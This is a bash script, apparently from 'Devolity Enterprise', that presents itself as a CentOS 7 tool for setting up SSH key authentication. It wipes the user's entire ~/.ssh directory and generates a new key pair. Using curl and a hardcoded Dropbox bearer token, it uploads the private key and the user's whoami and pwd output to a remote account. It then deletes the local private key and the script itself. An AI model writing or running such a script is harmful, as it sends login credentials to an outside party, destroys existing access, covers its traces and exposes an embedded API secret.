#!/bin/bash
#
#   _____   .__     .______.
#  /  _  \  |__|  __| _/\_ |__    ______
# /  /_\  \ |  | / __ |  | __ \  /  ___/
#/    |    \|  |/ /_/ |  | \_\ \ \___ \
#\____|__  /|__|\____ |  |___  //____  >
#        \/          \/      \/      \/
#
###############
########### SSH Key Based Authentication
##### Created By Devolity Enterprise
##### Script Perfectly Work On Centos 7

printf "##### Please Run this script in User Directory, which was access by SSH/SFTP Verify your SSH Key Path #### \n"

##### 
hname=`hostname -s`
ipaddr=`ip route get 172.31.0.100 | sed -n '/src/{s/.*src *\([^ ]*\).*/\1/p;q}'`
keyname=`echo $hname-$ipaddr`

##### Generate Key - Make Dir .SSH
rm -rf ~/.ssh
mkdir ~/.ssh
chmod 700 ~/.ssh
ssh-keygen -t rsa -b 4096 -N '' -v -f ~/.ssh/$keyname

##### Move and Copy Public Key
mv ~/.ssh/$keyname ~/.ssh/$keyname.pem
cp ~/.ssh/$keyname.pub ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

### User details
pwd > $keyname.txt
whoami >> $keyname.txt

##### Uploading File to Cloud

curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer N-1uJICccaAAAAAAAAAAPRuQ0V_yne4zI_bFcwTiJ9G5oj3RXAfY9VqRdNRK9PpX" --header "Dropbox-API-Arg: {\"path\": \"/$keyname.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @$keyname.txt

cd ~/.ssh

curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer N-1uJICccaAAAAAAAAAAPRuQ0V_yne4zI_bFcwTiJ9G5oj3RXAfY9VqRdNRK9PpX" --header "Dropbox-API-Arg: {\"path\": \"/$keyname.pem\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @$keyname.pem

##### Remove Pvt Key 
rm -rf ~/.ssh/$keyname.*

##### Changing Configuration on SSH/Conf
#sed -i 's/PasswordAuthentication.*/PasswordAuthentication no/g' /etc/ssh/sshd_config
#sed -i 's/^#PubkeyAuthentication yes/PubkeyAuthentication yes/g' /etc/ssh/sshd_config

#####
#systemctl restart sshd
#Falllback
#/etc/init.d/sshd restart

#####
printf "\033[1;32m Your Server is configure with Key based Authentication use '$keyname.pem' to Login \033[0m\n"

#####
cd ~/
rm -rf $keyname.txt
rm -rf user-level-ssh-gen.sh

##### END
#vi -b filename
#Then in vi, type:
#:%s/\r$//
#:x

